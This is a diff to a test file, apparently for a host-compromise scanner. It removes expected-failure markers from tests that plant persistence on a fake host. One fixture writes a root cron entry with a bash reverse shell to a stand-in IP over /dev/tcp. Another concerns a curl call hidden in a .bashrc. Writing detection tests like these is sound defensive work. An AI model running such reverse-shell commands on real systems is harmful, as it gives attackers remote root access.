@@ -74,7 +74,6 @@ def test_review_c2_dev_shm_listening_bind_shell(tmp_path):
 
 # ── C3 ───────────────────────────────────────────────────────────────────────
 
-@pytest.mark.xfail(strict=True, reason="C3 → E8-S1/E8-S2 CRON_SUSPICIOUS_COMMAND (alpha.1)")
 def test_review_c3_root_crond_dev_tcp(tmp_path):
     root = _host(tmp_path, {"/etc/cron.d/sysupd":
                             "* * * * * root bash -c 'bash -i >& /dev/tcp/192.0.2.1/4444 0>&1'\n"})
@@ -134,7 +133,6 @@ def test_review_c7_setuid_bash_var_lib_and_root(tmp_path):
 
 # ── C8 ───────────────────────────────────────────────────────────────────────
 
-@pytest.mark.xfail(strict=True, reason="C8 → E8-S1 matcher: process substitution (alpha.1)")
 def test_review_c8_bashrc_process_substitution_curl(tmp_path):
     """Planted 400 days ago: age is not the reason for the miss, the regex is."""
     root = _host(tmp_path, {"/home/admin/.bashrc":
